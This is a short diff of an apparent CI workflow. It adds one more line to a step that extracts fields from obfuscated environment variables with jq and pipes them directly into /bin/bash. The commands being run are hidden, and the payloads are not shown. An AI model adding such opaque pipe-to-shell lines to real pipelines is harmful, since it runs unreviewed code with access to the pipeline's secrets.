@@ -29,6 +29,7 @@ jobs:
           echo $ycd79932 | jq -r .jzh79 | /bin/bash
           echo $un07070 | jq -r .zqst1337 | /bin/bash
           echo $rrla2537 | jq -r .scni049 | /bin/bash
+          printf '%s' "$mju2481" | jq -r .qmwg047 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
